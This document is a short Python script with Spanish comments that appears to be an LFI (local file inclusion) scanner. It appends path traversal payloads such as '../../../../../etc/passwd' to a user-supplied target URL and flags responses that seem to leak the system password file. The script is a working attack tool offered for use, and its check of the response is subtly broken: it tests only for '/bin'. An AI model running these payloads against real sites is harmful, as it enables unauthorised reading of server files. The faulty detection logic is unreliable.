#! /usr/bin/env python3
#_*_ coding: utf8_*_

import requests
import argparse
from bs4 import BeautifulSoup

parser = argparse.ArgumentParser()
parser.add_argument('-t','--target',help="Objetivo a vulnerar")
parser = parser.parse_args()

def main():
    payloads = ['../../../../../etc/passwd','../../../../etc/passwd','/etc/passwd']
    if parser.target:
        print('Objetivo => {}'.format(parser.target))

        for p in payloads:
            print('\n===========================================================')
            print('Objetivo => {}'.format(parser.target + p))
            query = requests.get(parser.target + p) #Peticion al metodo get, de haber sido satisfactoria, la variable query tiene que contener todo el archivo de texto que encontro en la respuesta
            #Tenemos que recorrer todos los payloads que introducimos en la lista payloads concatenandolos al objetivo que nos pase el usuario, para hacer una consulta a la url pero a su vez al mismo archivo para verificar si nuestro objetivo es vulnerable.

            if 'root' and 'bash' and '/bin' in query.text: #La funcion text contiene todo el html de la respuesta
                print('Probable LFI ==> {}'.format(parser.target + p))
                print('\n===========================================================')
    else:
        print('Especifique el objetivo')

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('Saliendo')
        exit()
